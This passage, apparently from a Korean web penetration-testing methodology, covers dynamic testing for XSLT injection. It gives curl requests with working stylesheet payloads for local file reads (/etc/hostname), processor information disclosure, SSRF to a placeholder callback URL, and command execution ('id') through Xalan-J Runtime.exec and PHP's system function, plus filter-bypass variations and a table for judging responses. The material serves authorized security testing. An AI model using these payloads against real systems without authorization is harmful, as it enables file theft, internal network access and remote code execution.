### Phase 2: 동적 테스트 (검증)


**사전 확인: XSLT 입력 방식 식별**

Phase 1에서 XSLT 스타일시트가 사용자 입력을 받는 방식을 확인한다:
- XML 요청 본문 내에 XSLT 코드가 직접 포함되는 경우
- 파라미터를 통해 XSLT 내 변수/표현식에 값이 삽입되는 경우
- 사용자가 업로드한 XSLT/XML 파일이 처리되는 경우

---

**파일 읽기 테스트 (document() 함수):**

XML 요청 본문으로 전체 XSLT를 전송하는 경우:
```
curl -X POST "https://target.com/api/transform" \
  -H "Content-Type: application/xml" \
  -H "Cookie: session=SESSION_COOKIE" \
  -d '<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:template match="/">
    <output><xsl:value-of select="document('"'"'/etc/hostname'"'"')"/></output>
  </xsl:template>
</xsl:stylesheet>'
```

파라미터를 통해 XPath 표현식에 삽입되는 경우:
```
# 파라미터 값에 XSLT 함수 삽입
curl "https://target.com/api/transform?xpath=document('/etc/hostname')"
```

**정보 노출 테스트 (system-property):**
```
curl -X POST "https://target.com/api/transform" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:template match="/">
    <info>
      <vendor><xsl:value-of select="system-property('"'"'xsl:vendor'"'"')"/></vendor>
      <version><xsl:value-of select="system-property('"'"'xsl:version'"'"')"/></version>
    </info>
  </xsl:template>
</xsl:stylesheet>'
```

**SSRF 테스트 (document() + 외부 URL):**
```
curl -X POST "https://target.com/api/transform" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:template match="/">
    <output><xsl:value-of select="document('"'"'https://CALLBACK_URL/xslt-ssrf'"'"')"/></output>
  </xsl:template>
</xsl:stylesheet>'
```

**RCE 테스트 (프로세서별):**

Xalan-J (Java):
```
curl -X POST "https://target.com/api/transform" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" version="1.0">
  <xsl:template match="/">
    <xsl:variable name="rtObj" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtObj,'"'"'id'"'"')"/>
    <output><xsl:value-of select="$process"/></output>
  </xsl:template>
</xsl:stylesheet>'
```

libxslt (PHP/Python):
```
curl -X POST "https://target.com/api/transform" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <output><xsl:value-of select="php:function('"'"'system'"'"','"'"'id'"'"')"/></output>
  </xsl:template>
</xsl:stylesheet>'
```

---

**우회 기법:**
- Content-Type 변형: `text/xml`, `application/xslt+xml`, `application/xml` 각각 시도
- 인코딩 변형: UTF-16 BOM 추가, CDATA 래핑
- XSLT 2.0+ 기능: `unparsed-text()` 함수 (Saxon 프로세서)
- 네임스페이스 변형: 비표준 네임스페이스 접두어 사용

**응답 분석 기준:**

| 응답 유형 | 판단 |
|-----------|------|
| 응답에 `/etc/hostname` 내용 또는 파일 내용 반영 | 확인됨 (파일 읽기) |
| 응답에 `xsl:vendor` 값 반영 (Apache, libxslt 등) | 확인됨 (정보 노출) |
| 콜백 서비스에서 요청 수신 | 확인됨 (SSRF) |
| 응답에 명령어 실행 결과 반영 | 확인됨 (RCE) |
| XSLT 파싱 에러 (`TransformerException` 등) | 후보 (XSLT 처리는 확인, 조작은 미확인) |
| 입력 검증 에러 / XML 거부 | 안전 (입력 필터링 동작) |
| 정상 변환 결과 (페이로드 무시) | 안전 (사용자 입력이 XSLT에 반영되지 않음) |

**검증 기준:**
- **확인됨**: 동적 테스트로 XSLT 변환 조작을 통해 파일 읽기, 정보 노출, SSRF, 또는 RCE가 확인됨
